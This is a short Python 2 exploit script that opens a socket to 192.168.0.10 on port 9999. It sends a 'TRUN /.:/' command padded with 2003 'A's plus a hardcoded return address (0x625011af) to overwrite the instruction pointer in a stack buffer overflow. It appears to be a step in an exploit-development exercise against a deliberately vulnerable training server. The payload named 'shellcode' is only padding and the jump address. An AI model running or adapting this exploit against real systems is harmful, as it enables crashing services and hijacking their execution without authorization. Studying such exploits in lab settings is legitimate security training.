#!/usr/bin/python
import sys
import socket
# Python 2 version of this script


# Unprotected return address: 0x625011af

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.10', 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print("Error while connecting to server")
    sys.exit()